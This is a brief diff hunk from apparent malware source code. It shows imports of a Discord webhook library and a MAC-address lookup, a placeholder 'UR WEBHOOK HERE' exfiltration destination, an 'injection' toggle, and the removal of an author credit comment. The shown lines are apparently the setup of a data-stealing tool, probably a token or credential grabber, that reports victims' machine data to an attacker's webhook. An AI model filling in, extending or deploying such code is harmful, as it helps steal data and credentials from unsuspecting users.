@@ -31,7 +31,6 @@ from discord_webhook import DiscordWebhook, DiscordEmbed
 from getmac import get_mac_address as gma
 
 weblink = "UR WEBHOOK HERE"
-#The injection Was Mad By Rdimo#6969
 injection = "YES OR NO | I REC YES"
 
 
